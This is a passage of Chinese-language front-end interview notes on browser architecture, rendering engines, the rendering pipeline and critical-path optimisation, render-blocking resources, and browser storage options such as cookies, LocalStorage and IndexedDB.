| **强制刷新（Ctrl + F5 / Shift + F5）** | **忽略缓存**                     | 浏览器**不使用缓存**，所有资源重新向服务器请求（强制 200 OK） | 用于确保获取最新版本的资源                                   |
| **地址栏回车刷新**                     | **普通刷新行为**（视浏览器实现） | 通常与 F5 相同，会检查缓存                                   | 有些浏览器可能像 F5，也可能使用缓存，具体依赖缓存策略        |

# 4. 浏览器组成
## 1. 对浏览器的理解

浏览器是用户与 Web 之间的桥梁，负责页面渲染、JavaScript 执行、网络请求和数据存储。核心模块包括 UI 渲染引擎、JS 引擎、网络层、存储模块和事件系统。浏览器解析 HTML/CSS/JS 构建 DOM/CSSOM 渲染树，执行布局和绘制，并通过 Event Loop 管理异步任务。同时浏览器提供缓存和安全机制，如同源策略、CORS 和 CSP。

> **浏览器是用户和 Web 之间的桥梁，用于解析 HTML/CSS/JS，展示网页，执行用户交互，并管理网络请求和数据存储。**

核心职责：

1. **界面渲染** → 将网页内容呈现给用户
2. **脚本执行** → 运行 JavaScript，处理逻辑
3. **网络请求** → 获取资源（HTML/CSS/JS/图片）
4. **数据存储** → Cookie / LocalStorage / SessionStorage / IndexedDB

## 2. 浏览器工作原理（加载页面流程)

1. **输入 URL → DNS 解析 → 建立 TCP 连接 → HTTPS 握手**
2. **发送 HTTP 请求 → 接收 HTML 内容**
3. **HTML 解析 → 构建 DOM 树**
4. **CSS 解析 → 构建 CSSOM 树 → 构建渲染树**
5. **JavaScript 执行 → 可能修改 DOM/CSSOM → 触发重排/重绘**
6. **布局（Layout） → 绘制（Paint） → 合成（Composite）**
7. **事件绑定 → 用户交互触发事件 → Event Loop 执行回调**

## 2. 对浏览器内核的理解

浏览器内核是浏览器解析 HTML、CSS、执行 JS、布局和渲染页面的核心模块。它解析 HTML/CSS 构建 DOM/CSSOM 树，生成渲染树，执行布局和绘制，最终将页面显示在屏幕上。JS 引擎执行脚本修改 DOM/CSSOM，可触发重排和重绘。常见内核有 Blink（Chrome/Edge）、WebKit（Safari）、Gecko（Firefox）和 Trident（IE）。

**浏览器内核（Browser Engine / Rendering Engine）是浏览器负责解析 HTML、CSS、执行 JS、布局和渲染页面的核心模块。**
 它将网页内容转化为可视化页面，是浏览器“核心大脑”。

| 内核         | 浏览器示例          | 备注                            |
| ------------ | ------------------- | ------------------------------- |
| **Blink**    | Chrome、Edge、Opera | Google 维护，基于 WebKit 分叉   |
| **WebKit**   | Safari              | 苹果维护，移动端 Web 浏览器核心 |
| **Gecko**    | Firefox             | Mozilla 维护                    |
| **Trident**  | IE                  | 微软 IE 内核，老旧              |
| **EdgeHTML** | Edge（旧版）        | 微软 Edge 旧版，已被 Blink 取代 |

### 浏览器内核的核心职责

```css
浏览器接收 HTML
        │
     解析 HTML → DOM 树
        │
     解析 CSS → CSSOM 树
        │
    DOM + CSSOM → 渲染树
        │
        布局（Layout）
        │
        绘制（Paint）
        │
        合成（Composite）→ 页面显示
```

**HTML / CSS 解析**

- 将 HTML 解析成 **DOM 树**
- 将 CSS 解析成 **CSSOM 树**

**构建渲染树（Render Tree）**

- 结合 DOM 和 CSSOM
- 忽略 `display: none` 元素
- 用于页面布局和绘制

**布局（Layout / Reflow）**

- 计算每个节点的大小和位置

**绘制（Paint）**

- 将渲染树转为屏幕像素

**合成（Composite）**

- 将绘制结果分层合成，最终显示在屏幕上

**执行 JavaScript（通过 JS 引擎）**

- 修改 DOM / CSSOM → 触发重排（Reflow）或重绘（Repaint）

**事件处理**

- 捕获、冒泡事件流
- 配合 Event Loop 执行异步回调

----

**Blink 与 WebKit 的关系**

- Blink 是 Google 基于 WebKit 分叉的内核

**重排（Reflow）和重绘（Repaint）区别**

- Reflow → 触发布局计算，性能消耗大
- Repaint → 元素样式变化，不影响布局，消耗小

**浏览器内核与 JS 引擎关系**

- 内核负责解析和渲染，JS 引擎（如 V8）执行 JS 并可修改 DOM/CSSOM

**为什么 iframe / 沙箱需要内核支持**

- 内核保证页面独立渲染，沙箱隔离执行环境

## 3. 常见的浏览器内核比较

常见浏览器内核包括 Blink（Chrome、Edge）、WebKit（Safari）、Gecko（Firefox）、Trident（IE）和 EdgeHTML（旧版 Edge）。Blink 高性能、支持现代标准；WebKit 移动端优化好；Gecko 遵循标准性高；Trident/EdgeHTML 性能差、兼容性差。选择内核影响渲染性能、标准支持和跨平台能力。

| 内核         | 浏览器示例               | 语言/架构               | 特点                        | 优点                         | 缺点                         |
| ------------ | ------------------------ | ----------------------- | --------------------------- | ---------------------------- | ---------------------------- |
| **Blink**    | Chrome、新版 Edge、Opera | C++（基于 WebKit 分叉） | 高性能、高并发，事件驱动    | 支持现代标准、跨平台性能优异 | 体积大，历史兼容性差         |
| **WebKit**   | Safari、旧版 iOS 浏览器  | C++                     | 苹果维护，轻量、高性能      | 移动端优化好、节能           | 对某些 JS/HTML 新特性支持慢  |
| **Gecko**    | Firefox                  | C++                     | 完整实现 Web 标准，独立开发 | 标准化程度高、开放           | 内存占用相对高，渲染稍慢     |
| **Trident**  | IE                       | C++                     | 微软老旧内核                | 与 Windows 集成，兼容老网站  | 性能差，标准支持差，安全性低 |
| **EdgeHTML** | 旧版 Edge                | C++                     | 微软维护，Trident 改进版    | 比 IE 更标准                 | 已弃用，兼容性问题多         |

----

**Blink 与 WebKit 的关系**

- Blink 是 Google 基于 WebKit 分叉的内核，主要用于 Chrome/新版 Edge/Opera

**Trident 为什么被淘汰？**

- 性能低、标准支持差、安全性低，无法满足现代 Web 要求

**为什么 Safari 使用 WebKit 而非 Blink？**

- 苹果政策要求 iOS 浏览器必须使用 WebKit 内核

**Gecko 有何优势？**

- 高度遵循标准、开放性强、支持自定义扩展

## 4. 常见浏览器所用内核

| 内核         | 浏览器示例          | 备注                            |
| ------------ | ------------------- | ------------------------------- |
| **Blink**    | Chrome、Edge、Opera | Google 维护，基于 WebKit 分叉   |
| **WebKit**   | Safari              | 苹果维护，移动端 Web 浏览器核心 |
| **Gecko**    | Firefox             | Mozilla 维护                    |
| **Trident**  | IE                  | 微软 IE 内核，老旧              |
| **EdgeHTML** | Edge（旧版）        | 微软 Edge 旧版，已被 Blink 取代 |

## 5. 浏览器的主要组成部分

浏览器主要组成部分包括：用户界面、浏览器内核（渲染引擎）、JavaScript 引擎、网络层和数据存储模块。用户界面负责交互，渲染引擎解析 HTML/CSS 并生成页面，JS 引擎执行脚本修改 DOM/CSSOM，网络层管理请求和缓存，数据存储模块提供 Cookie、LocalStorage、SessionStorage 和 IndexedDB 支持。

浏览器主要可以分为 **5 个核心模块**：

注：一些浏览器还包含 **扩展/插件系统**，允许安装第三方功能。

| 模块                        | 功能                                                         |
| --------------------------- | ------------------------------------------------------------ |
| **用户界面（UI）**          | 地址栏、按钮、书签栏、标签页等可见部分，用户交互入口         |
| **浏览器内核 / 渲染引擎**   | 负责解析 HTML、CSS，构建 DOM/CSSOM 树，生成渲染树并绘制页面，执行布局和绘制 |
| **JS 引擎**                 | 解析和执行 JavaScript，处理 DOM/CSSOM 操作，管理 Event Loop（Chrome 使用 V8） |
| **网络层**                  | 负责 HTTP/HTTPS 请求，DNS 解析，缓存管理，Cookie 管理        |
| **数据存储 / 本地存储模块** | Cookie、LocalStorage、SessionStorage、IndexedDB，用于持久化和会话数据存储 |

浏览器工作流程示意（简化版）

```swift
用户输入 URL
        │
     浏览器网络层
        │
     获取 HTML/CSS/JS
        │
     渲染引擎解析 → DOM + CSSOM → 渲染树
        │
     布局（Layout） → 绘制（Paint） → 合成（Composite）
        │
     JS 引擎执行脚本 → 修改 DOM/CSSOM → 可能触发重排/重绘
        │
     用户看到最终页面

```

---

**浏览器内核和 JS 引擎的区别？**

- 内核负责解析和渲染，JS 引擎执行脚本并可修改 DOM/CSSOM

**浏览器如何处理事件？**

- 内核管理事件系统，支持捕获、目标、冒泡阶段
- JS 引擎通过 Event Loop 执行回调

**数据存储模块作用？**

- 提供持久化或会话数据存储（Cookie/LocalStorage/SessionStorage/IndexedDB）

**网络层和缓存机制？**

- 网络层发起请求，浏览器可利用 HTTP 强缓存/协商缓存提升性能

## 6. 浏览器优化相关知识点（面试常问）

**缓存机制**

- 强缓存（Expires/Cache-Control）
- 协商缓存（ETag/Last-Modified）

**渲染优化**

- 减少重排（Reflow）和重绘（Repaint）
- CSS/JS 放置位置优化加载

**安全机制**

- 同源策略（SOP）、CORS
- CSP、HttpOnly Cookie

**异步处理**

- Event Loop、微任务（Promise）、宏任务（setTimeout）
- Web Worker 多线程处理

# 5. 浏览器渲染原理

## 1. 浏览器的渲染过程

浏览器渲染过程：浏览器接收 HTML/CSS/JS，解析 HTML 构建 DOM 树，解析 CSS 构建 CSSOM 树，然后合并成渲染树。渲染树经过布局（Layout）计算节点尺寸和位置，再绘制（Paint）像素，最后合成（Composite）显示页面。JS 执行可修改 DOM/CSSOM，引起重排或重绘。优化方法包括减少 DOM 操作、使用异步 JS、分层渲染和 GPU 加速。

**浏览器渲染概念**

浏览器渲染过程是指浏览器接收 HTML/CSS/JS 等资源，将其解析、计算布局、绘制页面并显示给用户的全过程。

核心目标：

- 将网页内容解析成 DOM/CSSOM 树
- 构建 渲染树（Render Tree）
- 执行 布局（Layout） 和 绘制（Paint）
- 最终显示页面

```mathematica
HTML → DOM
CSS → CSSOM
DOM + CSSOM → Render Tree
Render Tree → Layout（计算尺寸和位置）
Layout → Paint（绘制像素）
Paint → Composite（分层合成）
最终显示页面
```

### 1️⃣ 解析 HTML → 构建 DOM 树

- HTML 标签解析 → 节点树
- 文本、元素、属性都成为 DOM 节点
- 遇到 `<script>` 阻塞解析（同步 JS）

### 2️⃣ 解析 CSS → 构建 CSSOM 树

- 加载 CSS 文件或 `<style>` 标签
- 解析选择器和样式规则 → 构建 CSSOM 树

### 3️⃣ 构建渲染树（Render Tree）

- 合并 DOM 树和 CSSOM 树
- 忽略 `display: none` 节点
- 节点包含可见样式和布局信息

### 4️⃣ 布局（Layout / Reflow）

- 计算渲染树每个节点的尺寸、位置
- 生成绘制坐标（x, y, width, height）

### 5️⃣ 绘制（Paint）

- 将渲染树每个节点转化为屏幕像素
- 绘制文本、背景、边框、颜色、图片等

### 6️⃣ 合成（Composite）

- 将页面层（Layer）合并到屏幕上
- GPU 参与合成，提高性能

### 7️⃣ JS 执行（可触发重排/重绘）

- JS 修改 DOM/CSSOM → 可能触发 Reflow / Repaint
- Event Loop 管理异步任务执行

----

**重排（Reflow）和重绘（Repaint）区别**

- **Reflow** → 布局变化（尺寸/位置） → 消耗大
- **Repaint** → 样式变化（颜色/背景） → 消耗小

**为什么 JS 会阻塞渲染？**

- 同步 `<script>` 执行会阻塞 HTML 解析

**浏览器渲染优化**

- 减少 DOM 操作
- CSS 放在头部，JS 放在底部或异步加载
- 使用 `transform` 和 `opacity` 避免触发重排

**分层渲染（Layer）优化**

- GPU 加速，减少重绘成本

## 2. 浏览器渲染优化

浏览器渲染优化主要针对减少重排（Reflow）、减少重绘（Repaint）、优化 JS 加载和网络资源、合理使用分层渲染和 GPU 加速。重排代价最大，应批量操作 DOM、避免频繁读取布局属性。动画推荐使用 transform 和 opacity，减少阻塞渲染的同步 JS 和阻塞 CSS，图片懒加载和压缩可以提升性能。

### 浏览器渲染性能瓶颈

浏览器渲染过程中主要消耗性能的环节：

1. **重排（Reflow / Layout）**
   - 当元素尺寸、位置、几何形状发生变化时
   - 会重新计算布局，影响子元素和父元素
   - **代价最大**
2. **重绘（Repaint）**
   - 元素样式改变但不影响布局（颜色、背景等）
   - **消耗比重排小**
3. **合成（Composite）**
   - 页面分层合成，如果层过多或频繁触发动画，也会消耗性能
4. **JS 执行阻塞**
   - 同步 JS 会阻塞 HTML 解析 → 阻塞页面渲染
5. **网络资源加载**
   - 阻塞 CSS/JS 加载或解析 → 阻塞首次渲染

------

### 浏览器渲染优化方法

### 1️⃣ 减少重排（Reflow）

- **批量操作 DOM**

  ```
  const fragment = document.createDocumentFragment();
  items.forEach(item => {
    const li = document.createElement('li');
    li.textContent = item;
    fragment.appendChild(li);
  });
  ul.appendChild(fragment);
  ```

- **避免频繁读取布局属性**（如 `offsetWidth`, `clientHeight`）

- **使用绝对定位或 `position: fixed` 进行动画**，减少父元素影响

### 2️⃣ 减少重绘（Repaint）

- **只修改必要样式**（如 `opacity`, `transform` 比 `top/left` 性能好）
- **使用 CSS class 切换样式**，避免直接操作 style 多次

### 3️⃣ CSS & JS 加载优化

- **CSS 放 `<head>`，JS 放底部或异步加载**

  ```
  <script src="main.js" defer></script>
  <script src="main.js" async></script>
  ```

- **使用 `link rel="preload"` 或 CDN** 提升加载速度

### 4️⃣ 页面渲染优化

- **分层渲染（Layer）**
  - GPU 加速动画，避免触发重排
  - CSS 属性如 `transform`、`opacity` 可以独立分层
- **避免大量 DOM 节点**
  - 虚拟列表 / 虚拟滚动技术

### 5️⃣ 图片与资源优化

- **图片懒加载**
- **使用 WebP 或压缩图片**
- **字体优化**，避免阻塞渲染

------

1. **重排和重绘区别？**
   - Reflow → 布局变化，代价大
   - Repaint → 样式变化，不影响布局，代价小
2. **为什么 `transform` 和 `opacity` 动画性能好？**
   - 可以直接由 GPU 分层合成，不触发重排
3. **JS 如何阻塞渲染？**
   - 同步 `<script>` 标签会阻塞 HTML 解析，影响首次渲染
4. **优化首屏渲染的方法？**
   - CSS 放在头部，JS 异步或延迟加载
   - 图片懒加载
   - 减少 DOM 节点和复杂布局

## 3. 渲染过程中遇到 JS 文件如何处理?

**浏览器渲染遇到 JS 文件时：默认同步 JS 会阻塞 HTML 解析，下载并执行 JS 后继续解析。`async` JS 不阻塞解析，下载完成立即执行，顺序不保证；`defer` JS 不阻塞解析，DOM 构建完成后按顺序执行。选择合适方式可优化渲染性能和页面加载速度。**

浏览器解析 HTML 时，如果遇到 `<script>` 标签，会对渲染流程产生影响，处理方式取决于 JS 的加载方式和属性（同步 / 异步 / 延迟加载）。

**同步 JS（默认 `<script>`）**

```
<script src="main.js"></script>
```

- **流程：**
  1. HTML 解析到 `<script>` 时，**暂停 DOM 构建**
  2. 浏览器下载 JS 文件（阻塞解析）
  3. JS 执行（可能修改 DOM / CSSOM）
  4. 执行完毕 → 继续解析 HTML
- **特点：**
  - 阻塞 HTML 解析 → 可能影响首次渲染
  - 可修改已经解析的 DOM / CSSOM

------

**异步加载 JS (`async`)**

```
<script src="main.js" async></script>
```

- **流程：**
  1. 浏览器继续解析 HTML，不阻塞 DOM 构建
  2. JS 文件异步下载
  3. 下载完成 → **立即执行 JS**（可能打断 HTML 解析，但不阻塞加载）
- **特点：**
  - 不保证执行顺序，先下载完成先执行
  - 可用于独立 JS 文件（广告、统计）

------

**延迟加载 JS (`defer`)**

```
<script src="main.js" defer></script>
```

- **流程：**
  1. 浏览器继续解析 HTML，不阻塞 DOM 构建
  2. JS 文件异步下载
  3. **DOM 构建完成后才执行**，执行顺序按照标签顺序
- **特点：**
  - 保证顺序执行
  - 不阻塞解析，推荐用于主逻辑 JS

------

**总结处理方式对比**

| 属性 / 类型        | 是否阻塞 HTML 解析 | 执行时机           | 执行顺序   |
| ------------------ | ------------------ | ------------------ | ---------- |
| `<script>`（默认） | ✅ 阻塞             | 下载完成立即执行   | 按标签顺序 |
| `<script async>`   | ❌ 不阻塞           | 下载完成立即执行   | 不保证顺序 |
| `<script defer>`   | ❌ 不阻塞           | DOM 完全构建后执行 | 按标签顺序 |

------

1. **为什么同步 JS 阻塞渲染？**
   - JS 执行可能修改 DOM/CSSOM，浏览器必须暂停解析，保证正确渲染顺序
2. **async 和 defer 的区别？**
   - async → 下载完成立即执行，顺序不保证
   - defer → DOM 构建完成后执行，顺序按标签顺序
3. **JS 可以修改 DOM 吗？**
   - 可以，修改可能触发重排（Reflow）和重绘（Repaint）
4. **最佳实践？**
   - 核心业务 JS 推荐使用 `defer`
   - 独立 JS（统计、广告）推荐使用 `async`

## 4. 什么是文档的预解析?

文档的预解析是浏览器在解析 HTML 时，为了提升页面渲染性能而提前扫描或加载资源的机制。它包括 JS 的语法预解析、HTML 中资源标签的预扫描，以及通过 preload / prefetch 提前加载资源。预解析可以缩短等待时间、减少阻塞，提高页面渲染速度。

**文档的预解析（Pre-parsing / Preloading）是浏览器在解析 HTML 时，为了加快页面渲染而提前扫描或加载某些资源的机制。**它的目标是 **减少阻塞渲染和提高页面加载速度**。

### 文档预解析的场景

**预解析 JavaScript**

- 浏览器在遇到 `<script>` 之前，会扫描 HTML 代码，提前解析 JS 语法
- 发现语法错误或提前生成函数、变量作用域信息，提高执行效率
- 但 JS 下载仍需实际网络请求

**预加载资源（Preload / Prefetch）**

- `<link rel="preload" href="style.css">`
  - 告诉浏览器提前加载资源，但不立即执行
- `<link rel="prefetch" href="next-page.js">`
  - 提前加载可能在未来使用的资源，减少等待时间

**预解析 DOM / 标签**

- 浏览器解析 HTML 时会扫描文档树
- 遇到资源（如 `<img>`、`<script>`、`<link>`）会 **提前发起请求**
- 当解析到真正位置时，资源已经在缓存中，可立即使用

### 浏览器的优化机制

| 机制                   | 说明                         | 目的                               |
| :--------------------- | :--------------------------- | :--------------------------------- |
| **HTML 预解析**        | 在解析 HTML 时扫描资源标签   | 提前发起网络请求                   |
| **JS 预解析**          | 浏览器扫描 JS 语法           | 发现错误、生成作用域、提高执行速度 |
| **Preload / Prefetch** | 开发者显式告诉浏览器提前加载 | 缩短资源等待时间，优化渲染         |

---

**预解析和懒加载区别？**

- **预解析 / 预加载** → 提前下载或解析资源，提高性能
- **懒加载** → 等资源真正使用时才加载

**浏览器为什么需要预解析 JS？**

- 提前解析语法、生成作用域链
- 避免执行时阻塞渲染，提高渲染效率

**常见优化实践**

- `<script defer>` / `<script async>`
- `<link rel="preload">` / `<link rel="prefetch">`
- CSS 放在 `<head>`，减少阻塞

## 5. CSS 如何阻塞文档解析?

**CSS 会阻塞文档解析**，是因为浏览器必须在渲染内容之前确定样式信息，否则可能出现 **闪烁（FOUC, Flash of Unstyled Content）** 或布局错误。

**渲染树（Render Tree）依赖 DOM + CSSOM**

**CSS 未加载完成 → 渲染树不完整 → 无法布局 → 阻塞渲染**

### CSS 阻塞解析的机制

**HTML 解析遇到 `<link rel="stylesheet">`**

- 浏览器发现外部 CSS
- **暂停构建渲染树**
- 发起 CSS 文件下载
- 下载完成 → 解析 CSSOM → 恢复渲染树构建

**内联 `<style>` 标签**

- 浏览器同步解析 CSS
- 构建 CSSOM → 继续渲染

### 为什么 CSS 会阻塞渲染

**保证渲染正确性**

- 浏览器需要先知道元素样式，才能正确计算尺寸和布局

**防止闪烁（FOUC）**

- 如果不阻塞，HTML 先渲染 → 再加载 CSS → 页面闪烁

**依赖渲染树**

- 渲染树 = DOM + CSSOM
- CSS 未解析完成 → CSSOM 未完成 → 渲染树不完整 → 页面无法绘制

### 优化方法

1. **使用 `media` 属性按需加载**

```
<link rel="stylesheet" href="print.css" media="print">
```

- 非关键 CSS 不阻塞初始渲染

2. **关键 CSS 内联（Critical CSS）**

- 页面首屏关键样式直接写入 `<style>`，减少阻塞请求

3. **异步加载 CSS**

```
<link rel="stylesheet" href="style.css" media="print" onload="this.media='all'">
```

- 初始不阻塞，加载完成后应用

**4. 压缩和合并 CSS**

- 减少请求次数和下载时间

**5. 影响范围**

- 阻塞渲染 **但不阻塞 DOM 构建**（DOM 可以继续生成，但页面不可视）
- 阻塞后续 JS 执行（如果 JS 操作了 DOM 或依赖样式）

---

**CSS 和 JS 阻塞解析的区别？**

- CSS 阻塞渲染，但 DOM 可以继续构建
- JS 默认阻塞 HTML 解析（除 async / defer）

**为什么 JS 会阻塞 DOM，而 CSS 不阻塞 DOM？**

- JS 执行可能修改 DOM → 必须暂停解析
- CSS 只影响渲染树 → DOM 仍可构建

**浏览器如何保证页面不闪烁？**

- 阻塞 CSS 渲染 → 渲染树完整 → 页面一次性绘制

## 6. 如何优化关键渲染路径?

关键渲染路径优化的核心是减少阻塞资源和缩短渲染链路。主要手段包括：内联关键 CSS、延迟加载非关键 CSS；JS 使用 defer 或 async，避免阻塞 HTML 解析；精简 DOM 结构；使用 preload 提前加载关键资源；图片和字体优化。目标是尽快完成首屏渲染和提升 LCP 指标。

**关键渲染路径**是指浏览器从获取 HTML、CSS、JS，到生成 DOM、CSSOM、渲染树、完成布局和绘制，最终把内容显示到屏幕的这条最短、最重要的执行路径。

**目标：**

- 尽快完成 **首屏渲染（First Paint / LCP）**
- 减少阻塞资源
- 缩短渲染链路

**关键阻塞点主要有 4 个：**

1. **阻塞 HTML 解析**
   - 同步 JS
2. **阻塞 CSSOM 构建**
   - 外部 CSS 文件
3. **DOM / CSSOM 体积过大**
   - 解析慢、布局慢
4. **JS 执行过多 / 过早**
   - 延迟首屏渲染

优化关键渲染路径的核心思路：

CRP 优化 = 减少关键资源数量 + 缩短关键资源体积 + 降低关键路径长度

### 具体优化手段

#### 1️⃣ 优化 HTML（让 DOM 更快生成）

- 精简 DOM 结构
- 减少嵌套层级
- 避免首屏无关节点

👉 DOM 越小，解析 + Layout 越快

------

#### 2️⃣ 优化 CSS（最关键）

##### ✅ 关键 CSS 内联（Critical CSS）

```
<style>
  /* 首屏必须样式 */
</style>
```

- 避免首屏等待外部 CSS
- 外部 CSS 延迟加载

##### ✅ 非关键 CSS 延后加载

```
<link rel="stylesheet" href="style.css" media="print" onload="this.media='all'">
```

##### ✅ 减少 CSS 阻塞

- 合并 CSS
- 压缩 CSS
- 避免复杂选择器

------

#### 3️⃣ 优化 JavaScript（面试高频）

##### ✅ 使用 `defer` / `async`

```
<script src="main.js" defer></script>
```

- **defer**：不阻塞 HTML，DOM 构建后执行（推荐）
- **async**：下载完成立即执行（不保证顺序）

##### ❌ 避免首屏同步 JS

```
<script src="heavy.js"></script> <!-- ❌ -->
```

------

#### 4️⃣ 优化资源加载顺序（非常重要）

##### ✅ 使用 `preload`

```
<link rel="preload" href="style.css" as="style">
```

- 提前加载关键资源

##### ✅ 使用 `prefetch`

```
<link rel="prefetch" href="next.js">
```

- 提前加载未来可能用到的资源

------

#### 5️⃣ 图片和字体优化

- 图片懒加载
- WebP / AVIF
- 字体使用 `font-display: swap`

```
@font-face {
  font-display: swap;
}
```

------

#### 6️⃣ 减少重排 / 重绘

- 使用 `transform`、`opacity`
- 批量 DOM 操作
- 避免频繁读取布局信息

----

❓**CSS 为什么是关键资源？**
 👉 因为渲染树依赖 CSSOM

❓**JS 为什么会阻塞 CRP？**
 👉 JS 可能修改 DOM / CSSOM，必须暂停解析

❓**CRP 和性能指标关系？**
 👉 直接影响 FP / FCP / LCP

## 7. 什么情况会阻塞渲染?

凡是会延迟 DOM、CSSOM、Render Tree 构建或阻止首次绘制（First Paint）的操作，都会阻塞浏览器渲染。

### 最核心的 5 大类阻塞渲染场景

#### 1️⃣ 同步 JavaScript（最常见、最严重）

```
<script src="main.js"></script>
```

**为什么阻塞：**

- JS 可能修改 DOM / CSSOM
- 浏览器必须暂停 HTML 解析
- 下载 + 执行期间页面无法渲染

**结论：**

- **同步 JS 会阻塞 HTML 解析和渲染**

------

#### 2️⃣ CSS 加载和解析（阻塞渲染树）

```
<link rel="stylesheet" href="style.css">
```

**为什么阻塞：**

- 渲染树 = DOM + CSSOM
- CSS 未加载完成 → CSSOM 不完整
- 无法计算布局 → 无法渲染

⚠️ 注意：

- **CSS 不阻塞 DOM 构建**
- **但会阻塞页面显示（渲染）**

------

#### 3️⃣ JS 依赖 CSSOM（隐式阻塞）

```
<link rel="stylesheet" href="style.css">
<script src="main.js"></script>
```

**现象：**

- JS 读取样式（如 `getComputedStyle`）
- 浏览器必须等待 CSS 下载并解析完成
- JS 被延迟执行 → 间接阻塞渲染

------

#### 4️⃣ 大量或复杂的 DOM / CSS（计算阻塞）

- DOM 节点数量巨大
- CSS 选择器复杂（深层嵌套、通配符）
- 布局计算复杂（表格、Flex/Grid 嵌套）

**结果：**

- Layout（重排）耗时
- Paint / Composite 延迟
- 表现为“渲染卡顿”

------

#### 5️⃣ 长时间 JavaScript 执行（主线程阻塞）

```
while(true) {} // ❌
```

**原因：**

- JS 在主线程执行
- 长任务会阻塞：
  - 页面渲染
  - 用户交互
  - 动画

#### 6️⃣ Web 字体阻塞（FOIT）

```
@font-face {
  font-family: MyFont;
  src: url(font.woff2);
}
```

- 字体未加载完成 → 文本不可见
- 解决方案：`font-display: swap`

------

#### 7️⃣ 图片过大或未优化

- 首屏大图体积大
- 阻塞 LCP（最大内容绘制）

------

#### 8️⃣ iframe / 同步资源

- 同步 iframe
- 第三方脚本（广告、统计）

# 6. 浏览器本地存储
## 1. 浏览器本地存储方式及使用场景

| 存储方式           | 特点                                                    | 容量                  | 生命周期                           | 是否随请求发送给服务器   | 典型使用场景                                |
| ------------------ | ------------------------------------------------------- | --------------------- | ---------------------------------- | ------------------------ | ------------------------------------------- |
| **Cookie**         | 小数据，key-value，支持过期时间，可标记 HttpOnly/Secure | ~4KB                  | 可设置过期时间，默认会话           | ✅ 会随每次 HTTP 请求发送 | 会话标识（登录状态）、追踪用户行为          |
| **LocalStorage**   | key-value 字符串存储，简单 API                          | ~5-10MB               | 永久，除非手动清除                 | ❌ 不随请求发送           | 保存用户偏好设置、主题、购物车信息          |
| **SessionStorage** | key-value，和 LocalStorage 类似                         | ~5MB                  | 页面会话生命周期（关闭页面即失效） | ❌ 不随请求发送           | 临时数据，表单状态、页面临时缓存            |
| **IndexedDB**      | 对象存储，可存储复杂数据/文件                           | 几百 MB（浏览器限制） | 永久                               | ❌ 不随请求发送           | 大型数据缓存、离线应用（PWA）、复杂结构数据 |

## 2. Cookie有哪些字段，作用分别是？

Cookie 是浏览器存储在客户端的小型 key-value 数据，可以随 HTTP 请求发送，用于会话管理、用户跟踪和偏好设置。

| 字段           | 作用                                              | 示例                                    |
| -------------- | ------------------------------------------------- | --------------------------------------- |
| **Name=Value** | 核心内容，存储数据                                | `token=abcd123`                         |
| **Expires**    | 设置过期时间，超时后浏览器自动删除 Cookie         | `Expires=Fri, 01 Jan 2027 00:00:00 GMT` |
| **Max-Age**    | 与 Expires 类似，设置存活秒数，优先级高于 Expires | `Max-Age=3600` （1小时）                |
| **Domain**     | 指定 Cookie 所属域名，默认当前域                  | `Domain=example.com`（子域可共享）      |
| **Path**       | 指定 Cookie 适用路径，默认 `/`                    | `Path=/admin`（仅/admin下有效）         |
| **Secure**     | 仅在 HTTPS 连接下发送                             | `Secure`                                |
| **HttpOnly**   | JS 脚本无法访问，防 XSS 攻击                      | `HttpOnly`                              |
| **SameSite**   | 防止跨站请求伪造（CSRF）                          | `SameSite=Strict/Lax/None`              |

## 3. Cookie、LocalStorage、SessionStorage?

| 特性               | Cookie                                      | LocalStorage                     | SessionStorage                         |
| ------------------ | ------------------------------------------- | -------------------------------- | -------------------------------------- |
| **存储位置**       | 客户端（浏览器）                            | 客户端（浏览器）                 | 客户端（浏览器）                       |
| **存储大小**       | ~4KB                                        | ~5-10MB                          | ~5MB                                   |
| **生命周期**       | 可设置过期时间                              | 永久（除非手动清除）             | 标签页会话，关闭即失效                 |
| **是否随请求发送** | ✅ 会随 HTTP 请求发送                        | ❌ 不随请求发送                   | ❌ 不随请求发送                         |
| **访问方式**       | document.cookie                             | localStorage.getItem / setItem   | sessionStorage.getItem / setItem       |
| **典型场景**       | 登录状态、追踪用户行为、CSRF / 会话管理     | 用户偏好设置、主题、购物车、缓存 | 表单临时数据、单页面应用状态、临时缓存 |
| **安全性**         | 可设置 HttpOnly 防 JS 访问，Secure 限 HTTPS | 易被 XSS 访问，需要防护          | 易被 XSS 访问，需要防护                |

## 4. 前端储存的方式有哪些?

前端存储方式包括浏览器本地存储（Cookie、LocalStorage、SessionStorage、IndexedDB）、内存缓存（JS 变量/Map/WeakMap）、浏览器缓存（强缓存/协商缓存）、以及 PWA Cache API 等。不同存储方式在容量、生命周期、是否随请求发送、持久化特性和使用场景上有所不同。

⚡ Tip：**LocalStorage / SessionStorage / IndexedDB** 不随 HTTP 请求发送，Cookie 会随请求发送。

| 存储方式           | 特点                           | 容量    | 生命周期   | 典型场景                      |
| ------------------ | ------------------------------ | ------- | ---------- | ----------------------------- |
| **Cookie**         | key-value 小数据，可随请求发送 | ~4KB    | 可设置过期 | 登录状态、会话管理、CSRF 防护 |
| **LocalStorage**   | key-value 字符串，简单 API     | ~5-10MB | 永久       | 用户偏好、主题、购物车、缓存  |
| **SessionStorage** | key-value，当前标签页有效      | ~5MB    | 标签页会话 | 表单临时数据、单页面应用状态  |
| **IndexedDB**      | 对象存储，支持复杂数据和大文件 | 几百 MB | 永久       | 离线缓存、大型数据存储、PWA   |

**内存缓存和浏览器本地存储的区别？**

- 内存缓存随页面刷新消失，LocalStorage / IndexedDB 持久化

**HTTP 缓存与本地存储有什么区别？**

- HTTP 缓存用于静态资源请求性能优化
- 本地存储用于 JS 数据持久化

## 5. IndexedDB有哪些特点?

IndexedDB 是浏览器提供的客户端数据库，用于存储大量结构化数据。它支持对象存储、事务、索引、异步操作和离线使用，容量大、性能高，适合存储复杂数据和离线 Web 应用。与 LocalStorage 相比，IndexedDB 更适合大型数据存储和复杂查询，但 API 相对复杂。

**IndexedDB 是浏览器提供的客户端数据库，用于存储大量结构化数据，支持事务、索引和离线应用。**
 与 LocalStorage 不同，它不是简单的 key-value，而是面向对象、支持查询的大型数据库。

| 特点                        | 说明                                                         |
| --------------------------- | ------------------------------------------------------------ |
| **面向对象存储**            | 可以存储对象（JSON）、数组、Blob 文件，不仅仅是字符串        |
| **支持事务（Transaction）** | 支持读写事务，保证数据一致性和完整性                         |
| **支持索引（Index）**       | 可以对对象属性创建索引，加快查询速度                         |
| **容量大**                  | 几百 MB，远大于 LocalStorage（5-10MB）                       |
| **异步操作**                | API 异步，使用事件或 Promise（部分库支持）防止阻塞 UI        |
| **离线可用**                | 适合 PWA 或离线 Web 应用存储数据                             |
